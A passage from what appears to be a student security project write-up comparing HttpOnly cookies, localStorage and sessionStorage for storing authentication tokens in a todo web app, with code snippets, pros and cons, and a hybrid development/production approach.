  // Clear local storage
  localStorage.removeItem('authToken');
  localStorage.removeItem('refreshToken');
  
  currentUser = null;
  showAuthPage();
}
```

**Token Storage Options:**

**Option 1: HttpOnly Cookies (Preferred)**
```javascript
// Set by server:
res.cookie('authToken', token, {
  httpOnly: true,  // JavaScript can't access
  secure: true,    // HTTPS only
  sameSite: 'lax' // CSRF protection
});

// Frontend (automatic):
fetch('/api/todos', { credentials: 'include' }); // Cookies sent automatically
```

**Pros:**
- ✅ XSS protection (JavaScript can't read)
- ✅ Automatic handling (browser sends)
- ✅ Secure flag for HTTPS

**Cons:**
- ❌ CSRF vulnerable (mitigated with SameSite)
- ❌ Can't inspect token easily (debugging)

**Option 2: localStorage**
```javascript
// Store:
localStorage.setItem('authToken', token);

// Retrieve:
const token = localStorage.getItem('authToken');

// Send:
fetch('/api/todos', {
  headers: { 'Authorization': `Bearer ${token}` }
});
```

**Pros:**
- ✅ No CSRF vulnerability
- ✅ Easy to inspect (DevTools)
- ✅ Works with CORS

**Cons:**
- ❌ XSS vulnerable (JavaScript can access)
- ❌ Persists across tabs
- ❌ Manual header management

**Option 3: sessionStorage**
```javascript
sessionStorage.setItem('authToken', token);
```

**Pros:**
- ✅ Clears on tab close
- ✅ Isolated per tab

**Cons:**
- ❌ XSS vulnerable
- ❌ Lost on refresh

**Our Hybrid Approach:**
```javascript
// Use BOTH for flexibility
// 1. Server sets HttpOnly cookies (preferred, XSS-safe)
res.cookie('authToken', token, { httpOnly: true });

// 2. Also send in response body for localStorage fallback
res.json({ authToken, refreshToken });

// 3. Frontend uses both
fetch('/api/todos', {
  credentials: 'include', // Sends cookies
  headers: {
    'Authorization': `Bearer ${localStorage.getItem('authToken')}` // Fallback
  }
});
```

**Why Hybrid:**
- Development: localStorage easier to debug
- Production: HttpOnly cookies more secure
- Flexibility: Works in different environments

**Security Recommendation:**
```javascript
if (process.env.NODE_ENV === 'production') {
  // Use HttpOnly cookies only
  // Remove localStorage tokens
} else {
  // Allow localStorage for debugging
}
```

---

## Summary

Each team member has demonstrated deep understanding of their assigned security primitive and how it integrates into the overall secure architecture of the application. The questions cover both theoretical knowledge and practical implementation details specific to this ISS project.
